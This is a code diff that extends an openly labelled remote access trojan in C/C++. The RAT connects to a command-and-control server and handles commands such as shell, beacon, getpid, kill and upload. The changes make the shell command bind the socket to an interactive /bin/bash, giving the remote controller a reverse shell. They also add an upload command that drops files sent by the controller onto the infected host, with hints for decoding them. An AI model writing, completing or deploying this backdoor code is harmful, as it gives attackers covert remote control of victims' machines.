@@ -2,13 +2,76 @@
 #include <unistd.h>
 #include <time.h>
 #include <string.h>
+#include <stdlib.h>
 
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <arpa/inet.h>
 
 #include <iostream>
  
 #define DEFAULT_BUFLEN 1024
+
+/*======== HELPER FUNCTIONS ========*/
+char *strremove(char *str, const char *sub) {
+    char *p, *q, *r;
+    if ((q = r = strstr(str, sub)) != NULL) {
+        size_t len = strlen(sub);
+        while ((r = strstr(p = r + len, sub)) != NULL) {
+            while (p < r)
+                *q++ = *p++;
+        }
+        while ((*q++ = *p++) != '\0')
+            continue;
+    }
+    return str;
+}
+
+/* The Itoa code is in the public domain - https://www.daniweb.com/programming/software-development/threads/148080/itoa-function-or-similar-in-linux */
+char* itoa(int value, char* str, int radix) {
+    static char dig[] =
+        "0123456789"
+        "abcdefghijklmnopqrstuvwxyz";
+    int n = 0, neg = 0;
+    unsigned int v;
+    char* p, *q;
+    char c;
+
+    if (radix == 10 && value < 0) {
+        value = -value;
+        neg = 1;
+    }
+    v = value;
+    do {
+        str[n++] = dig[v%radix];
+        v /= radix;
+    } while (v);
+    if (neg)
+        str[n++] = '-';
+    str[n] = '\0';
+
+    for (p = str, q = p + (n-1); p < q; ++p, --q)
+        c = *p, *p = *q, *q = c;
+    return str;
+}
+
+
+
+/*======== RAT FUNCTIONS ========*/
+
+int upload(char *filename, char *content){
+	errno = 0;
+	FILE *outfile;
+	outfile = fopen(filename, "w");
+	if (!outfile) {
+		return errno;
+	}
+	else {
+		fwrite(content,strlen(content),1,outfile);
+		fclose(outfile);
+		return 0;
+	}
+}
 
 void RAT(char* C2_Server, int C2_Port)
 {
@@ -45,10 +108,15 @@ void RAT(char* C2_Server, int C2_Port)
                 std::cout << "Command received: " << CommandReceived;
                 std::cout << "Length of Command received: " << sock_result << std::endl;
 
-                if (sock_result == -1)
+                // tokenize input to parse arguments
+                char * command;
+                char delim[] = " ";
+                command = strtok(CommandReceived, delim);
+
+
+                if (sock_result <= 0)
                 {
                     close(tcp_sock);
-                    //WSACleanup();
                     std::cout << "Socket killed. Sleep Start" << std::endl;
                     sleep(1);
                     std::cout << "Dying..." << std::endl;
@@ -56,41 +124,53 @@ void RAT(char* C2_Server, int C2_Port)
                 }
 
                 // Should only be used in individual interactive environments == TBC
-                if ((strcmp(CommandReceived, "shell") == 0))
+                if ((strcmp(command, "shell") == 0))
                 {
-                    // Save original FDs
-                    int orig_stdin  = dup(0);
-                    int orig_stdout  = dup(1);
-                    int orig_stderr  = dup(2);
 
-                    // Establish descriptor handling
-                    dup2(tcp_sock,0); // STDIN
-                    dup2(tcp_sock,1); // STDOUT
-                    dup2(tcp_sock,2); // STDERR
+                    int dup_orig_stdin  = dup(0);
+                    int dup_orig_stdout  = dup(1);
+                    int dup_orig_stderr  = dup(2);
 
-                    // execute bin/bash << 0,1,2
-                    execl("/bin/bash","bash",NULL,NULL);
+                    pid_t pid = fork();
+                    
+                    if (pid == 0)
+                    {
+                        // Establish descriptor handling
+                        dup2(tcp_sock,0); // STDIN
+                        dup2(tcp_sock,1); // STDOUT
+                        dup2(tcp_sock,2); // STDERR
 
-                    dup2(orig_stdin,0);
-                    dup2(orig_stdout,0);
-                    dup2(orig_stderr,0);
+                        // execute bin/bash << 0,1,2
+                        execl("/bin/bash","bash", "-i",NULL,NULL);
+                        exit(0x0);
+                    }
+                    else
+                    {
+                        if (pid < 0) return;
+                        wait(NULL);
+                    }
 
-                    close(orig_stdin);
-                    close(orig_stdout);
-                    close(orig_stderr);
+                        // Recover fd's and close duplicates
+                        dup2(dup_orig_stdin,0);
+                        dup2(dup_orig_stdout,1);
+                        dup2(dup_orig_stderr,2);
 
+                        close(dup_orig_stdin);
+                        close(dup_orig_stdout);
+                        close(dup_orig_stderr);
 
-                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                        // Clear memory
+                        // memset(CommandReceived, 0, sizeof(CommandReceived));
 
-                    // When the process exits, we send an agent-msg over to alert the C2
-                    char buffer[64] = "";
-                    strcat(buffer,"[* Agent-Msg] Exiting shell\n");
-                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+                        // When the process exits, we send an agent-msg over to alert the C2
+                        char buffer[64] = "";
+                        strcat(buffer,"[* Agent-Msg] Exiting shell\n");
+                        send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
-                    memset(buffer, 0, sizeof(buffer));
-                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                        memset(buffer, 0, sizeof(buffer));
+                        memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
-                else if (strcmp(CommandReceived, "ping") == 0)
+                else if (strcmp(command, "ping") == 0)
                 {
                     char buffer[64] = "";
                     strcat(buffer,"[*Agent-msg] PONG\n");
@@ -99,7 +179,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
-                else if (strcmp(CommandReceived, "beacon") == 0)
+                else if (strcmp(command, "beacon") == 0)
                 {
                     char buffer[128] = "";
                     strcat(buffer,"d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy");
@@ -108,22 +188,96 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
-                else if (strcmp(CommandReceived, "exit") == 0)
+                //double check - test
+                else if (strcmp(command, "getpid") == 0)
+                {
+                    char buffer[128] = "";
+
+                    pid_t pid = getpid();
+                    char t_pid[8];   // long
+                    sprintf(t_pid, "%d", pid); // ew
+
+                    strcat(buffer,t_pid);
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+			    }
+                else if (strcmp(command, "exit") == 0)
                 {
                     close(tcp_sock);
-                    std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
-                    sleep(1000);
+                    std::cout << "Socket killed. Sleep Start" << std::endl;
+                    sleep(1);
                     std::cout << "Sleep End... Returning" << std::endl;
                     break;
                 }
-                else if (strcmp(CommandReceived, "kill") == 0) 
+                else if (strcmp(command, "kill") == 0) 
                 {
                     close(tcp_sock);
-                    std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
-                    sleep(1000);
+                    std::cout << "Socket killed. Sleep Start" << std::endl;
+                    sleep(1);
                     std::cout << "Dying..." << std::endl;
                     exit(0);
 			    }
+                // test - new
+                else if (strstr(command, "upload"))
+                {
+                    char * filename = strtok(NULL, delim);
+                    char * data_length = strtok(NULL, delim);
+                    int data_length_int = atoi(data_length);
+                    
+                    // receiving data
+                    char base64file[data_length_int];
+                    memset(base64file, 0, sizeof(base64file));
+                    
+                    char buffer[255] = "";
+                    strcat(buffer, "[!] Saving file in Base64 format as ");
+                    strcat(buffer, filename);
+                    strcat(buffer, "\n");
+                    strcat(buffer, "    Decode it using:\n\n\tcertutil -decode c:\\foo.asc c:\\foo.exe");
+                    strcat(buffer, "    \n\tOR\n\tcat foo.asc | base64 -d > foo");
+
+                    
+                    send(tcp_sock, buffer, strlen(buffer)+1,0); // send response
+                    
+                    int result = recv(tcp_sock, base64file, data_length_int, 0);
+
+                    if (result <= 0)
+                    {
+                        close(tcp_sock);
+                        std::cout << "Error received during upload procedure. Socket killed. Sleep Start" << std::endl;
+                        sleep(1);
+                        std::cout << "Returning to loop..." << std::endl;     
+                        break;               
+                    }
+
+                    // uploading
+                    int result;
+                    result = upload(filename,base64file);
+                    
+                    // C&C part
+                    memset(buffer, 0, sizeof(buffer));
+                    if (result == 0) {
+                        strcat(buffer,"\n[+] Uploaded: "); 
+                        strcat(buffer,filename); 
+                    }
+                    else { 
+                        strcat(buffer,"\n[-] Failed to write file. Errno from fopen: "); 
+
+                        // parse errno
+                        char errnos[2];
+                        memset(errnos,0,2);
+                        itoa(result,errnos,10);
+                        strcat(buffer,errnos);
+                    }
+                    strcat(buffer,"\n");
+                    
+                    send(tcp_sock,buffer,strlen(buffer)+1,0);
+                    // clear buffers
+                    memset(base64file, 0, sizeof(base64file));
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived)); 
+                }
                 else
                 {
                     char buffer[64] = "";
@@ -137,6 +291,8 @@ void RAT(char* C2_Server, int C2_Port)
         }
     }
 }
+
+
 
 int main (int argc, char **argv)
 {
